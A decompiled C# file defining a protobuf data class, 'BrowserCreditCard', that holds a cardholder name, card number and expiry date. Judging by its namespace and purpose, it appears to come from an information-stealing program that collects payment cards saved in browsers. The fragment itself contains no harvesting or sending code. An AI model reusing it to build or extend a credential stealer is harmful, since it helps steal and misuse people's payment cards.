using System;
using System.Collections.Generic;
using System.ComponentModel;
using ProtoBuf;

namespace NoiseMe.Drags.App.Models.Common
{
	// Token: 0x02000161 RID: 353
	[ProtoContract(Name = "BrowserCreditCard")]
	public class BrowserCreditCard : INotifyPropertyChanged, IEqualityComparer<BrowserCreditCard>
	{
		// Token: 0x170002C4 RID: 708
		// (get) Token: 0x06000B43 RID: 2883 RVA: 0x00008AAF File Offset: 0x00006CAF
		// (set) Token: 0x06000B44 RID: 2884 RVA: 0x00008AB7 File Offset: 0x00006CB7
		[ProtoMember(1, Name = "Holder")]
		public string Holder
		{
			get
			{
				return this._holder;
			}
			set
			{
				this._holder = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Holder"));
			}
		}

		// Token: 0x170002C5 RID: 709
		// (get) Token: 0x06000B45 RID: 2885 RVA: 0x00008ADB File Offset: 0x00006CDB
		// (set) Token: 0x06000B46 RID: 2886 RVA: 0x00008AE3 File Offset: 0x00006CE3
		[ProtoMember(2, Name = "ExpirationMonth")]
		public int ExpirationMonth
		{
			get
			{
				return this._expirationMonth;
			}
			set
			{
				this._expirationMonth = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("ExpirationMonth"));
			}
		}

		// Token: 0x170002C6 RID: 710
		// (get) Token: 0x06000B47 RID: 2887 RVA: 0x00008B07 File Offset: 0x00006D07
		// (set) Token: 0x06000B48 RID: 2888 RVA: 0x00008B0F File Offset: 0x00006D0F
		[ProtoMember(3, Name = "ExpirationYear")]
		public int ExpirationYear
		{
			get
			{
				return this._expirationYear;
			}
			set
			{
				this._expirationYear = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("ExpirationYear"));
			}
		}

		// Token: 0x170002C7 RID: 711
		// (get) Token: 0x06000B49 RID: 2889 RVA: 0x00008B33 File Offset: 0x00006D33
		// (set) Token: 0x06000B4A RID: 2890 RVA: 0x00008B3B File Offset: 0x00006D3B
		[ProtoMember(4, Name = "CardNumber")]
		public string CardNumber
		{
			get
			{
				return this._cardNumber;
			}
			set
			{
				this._cardNumber = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("CardNumber"));
			}
		}

		// Token: 0x1400001D RID: 29
		// (add) Token: 0x06000B4B RID: 2891 RVA: 0x00022D20 File Offset: 0x00020F20
		// (remove) Token: 0x06000B4C RID: 2892 RVA: 0x00022D58 File Offset: 0x00020F58
		public event PropertyChangedEventHandler PropertyChanged;

		// Token: 0x06000B4D RID: 2893 RVA: 0x00008B5F File Offset: 0x00006D5F
		public bool Equals(BrowserCreditCard x, BrowserCreditCard y)
		{
			return x.Holder == y.Holder && x.CardNumber == y.CardNumber;
		}

		// Token: 0x06000B4E RID: 2894 RVA: 0x00022D90 File Offset: 0x00020F90
		public int GetHashCode(BrowserCreditCard obj)
		{
			int num = 37;
			num *= 397;
			if (!string.IsNullOrEmpty(obj.Holder))
			{
				num += obj.Holder.GetHashCode();
			}
			if (!string.IsNullOrEmpty(obj.CardNumber))
			{
				num += obj.CardNumber.GetHashCode();
			}
			return num;
		}

		// Token: 0x04000452 RID: 1106
		private string _holder;

		// Token: 0x04000453 RID: 1107
		private string _cardNumber;

		// Token: 0x04000454 RID: 1108
		private int _expirationMonth;

		// Token: 0x04000455 RID: 1109
		private int _expirationYear;
	}
}
